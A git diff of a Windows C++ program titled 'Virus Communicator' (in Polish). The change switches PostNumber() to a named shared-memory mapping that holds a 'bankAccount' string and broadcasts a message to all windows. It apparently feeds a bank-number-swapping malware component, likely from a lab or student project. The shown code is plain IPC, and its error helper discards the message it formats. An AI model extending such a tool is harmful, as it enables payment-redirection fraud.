@@ -12,6 +12,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void MoveToCb();
 void PostNumber();
 INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
+void GLEMAS();
 
 constexpr CHAR szClassName[] = "KomunikatorWirusa";
 constexpr CHAR windowTitle[] = "Komunikator Wirusa";
@@ -141,18 +142,38 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
 void PostNumber()
 {
-	HGLOBAL hGlobalMem = GlobalAlloc(GHND, sizeof(LPSTR)*(MAXL+1));
-	if (hGlobalMem != NULL)
-	{
-		/*LPSTR lpGlobalMem = LPSTR(GlobalLock(hGlobalMem));
-		memcpy(lpGlobalMem, bankAccount, MAXL + 1);
-		GlobalUnlock(hGlobalMem);
-		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LONG_PTR(hGlobalMem));*/
-		LPSTR lpGlobalMem = LPSTR(GlobalLock(hGlobalMem));
-		memcpy(lpGlobalMem, bankAccount, MAXL + 1);
-		//GlobalUnlock(hGlobalMem);
-		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LONG_PTR(lpGlobalMem));
-	}
+	HANDLE hMem = CreateFileMapping(
+		INVALID_HANDLE_VALUE,
+		NULL,
+		PAGE_READWRITE,
+		0,
+		MAXL + 1,
+		"Global\\FM_V"
+		);
+	if (hMem == NULL) GLEMAS();
+	LPCTSTR pBuf = (LPTSTR)MapViewOfFile(
+		hMem,
+		FILE_MAP_ALL_ACCESS,
+		0,
+		0,
+		MAXL + 1
+		);
+	if (pBuf == NULL) GLEMAS();
+	CopyMemory((PVOID)pBuf, bankAccount, (MAXL + 1)*sizeof(CHAR));
+
+	UnmapViewOfFile(pBuf);
+	//CloseHandle(hMem);
+
+	PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, NULL);
+}
+
+void GLEMAS()
+{
+	wchar_t buf[256];
+	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+		NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
+	int i = 0;
 }
 
 INT_PTR CALLBACK DialogProc(HWND hDlg, UINT msg, WPARAM wParam, LPARAM lParam)
